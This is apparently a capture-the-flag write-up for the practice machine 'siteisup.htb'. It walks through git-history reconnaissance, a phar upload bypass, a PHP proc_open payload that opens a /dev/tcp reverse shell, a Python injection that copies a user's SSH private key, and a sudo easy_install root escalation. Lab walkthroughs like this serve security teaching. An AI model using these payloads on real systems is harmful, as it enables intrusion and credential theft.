Initial Nmap Scan

```bash
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
Accessing siteisup.htb @ port 80

Exploring Local Git dir

```bash
Git branch -a
Git log main
commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

git show 8812785e31c879261050e72e20f298ae8c43b565
commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

diff --git a/.htaccess b/.htaccess
index 44ff240..b317ab5 100644
--- a/.htaccess
+++ b/.htaccess
@@ -2,3 +2,4 @@ SetEnvIfNoCase Special-Dev "only4dev" Required-Header
 Order Deny,Allow
 Deny from All
 Allow from env=Required-Header

```

Found another domain dev.siteisup.htb source code and another juicey information to access the domain 
It only access for developers Using coustom header "Special-Dev: only4dev"

Accessing dev.siteisup.htb

**FootHold**

Exploiting upload vulnerability and gain the shell but there has some fillters using to prevent to upload malicious file. we have only one way to upload a php file to gain code execution which is uploading a injected php code as phar file. Their is an another problem to gain shell the normal php shell command functions are disabled expect "proc_open" we get that info from "phpinfo" page 

Exploit using proc_open funtion

Reference [http://www.navioo.com/php/docs/function.proc-open.php](http://www.navioo.com/php/docs/function.proc-open.php)


Payload 

```php
<?php

$descriptorspec = array(
  0 => array("pipe", "r"),
  1 => array("pipe", "w"),
  2 => array("file", "/tmp/error-output.txt", "a")
);
$process = proc_open("cat", $descriptorspec, $pipes);
if (is_resource($process)) {

  fwrite($pipes[0], 'echo "bash -i >& /dev/tcp/ip/port 0>&1 " > /tmp/shell.sh | chmod 777 /tmp/shell.sh | sh /tmp/shell.sh');
   /* fwrite writes to stdin, 'cat' will immediately write the data from stdin
   * to stdout and blocks, when the stdout buffer is full. Then it will not
   * continue reading from stdin and php will block here.
   */
  fclose($pipes[0]);
  while (!feof($pipes[1])) {
      $out .= fgets($pipes[1], 1024);
  }
  fclose($pipes[1]);
  $return_value = proc_close($process);
}
?>
```

I wrote a python script for upload the file and trigger the file  

Escalating more privileged user

**www-data to user developer**

Home dir of the user developer has a coustom binary called siteisup which belongs with to a python script called siteisup_script.py and the binary has the setuid permission . Just run the binary and inject python system codes

Paylod for getting the developer ssh Key

```python
__import__("os")os.system("cat /home/developer/.ssh/id_rsa > /tmp/key")
```
**Privilege Escalation**

There is a Binary called  easy_install which has the permission running as superuser(Sudo)

Exploit 

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```
Reference [GtfoBin](https://gtfobins.github.io/gtfobins/easy_install/)



